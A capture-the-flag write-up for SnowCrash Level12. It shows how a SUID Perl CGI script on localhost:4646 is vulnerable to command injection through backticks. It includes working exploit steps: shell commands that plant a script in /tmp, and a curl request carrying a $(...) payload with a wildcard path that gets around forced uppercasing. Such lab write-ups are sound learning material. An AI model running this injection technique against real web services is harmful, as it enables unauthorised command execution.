# Level12 – SnowCrash

## Objective
Exploit a vulnerable SUID Perl CGI script to execute arbitrary commands and retrieve the flag.

## Reconnaissance
- `level12.pl` runs as SUID (`flag12`)
- Web service listening on `localhost:4646`
- Parameter `x` is injected into:
```bash
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
`$xx` is only uppercased and truncated at whitespace, but not sanitized against command substitution.
This leads to command injection via backticks.

## Exploitation
Because input is uppercased, the payload must be uppercase.
`*` is used as a wildcard to avoid hardcoding `/tmp` while still resolving `/tmp/GETTHEFLAG`.
1. Create a malicious script:
```bash
echo '#!/bin/sh' > /tmp/GETTHEFLAG
echo 'getflag > /tmp/pass.txt' >> /tmp/GETTHEFLAG
chmod +x /tmp/GETTHEFLAG
```
2. Trigger command execution through the CGI parameter:
```bash
curl 'http://localhost:4646/?x=$(/*/GETTHEFLAG)'
```
The injected command executes with SUID privileges and writes the flag to `/tmp/pass.txt`.

## Flag
![Level12 Flag Screenshot](images/level12_flag.png)

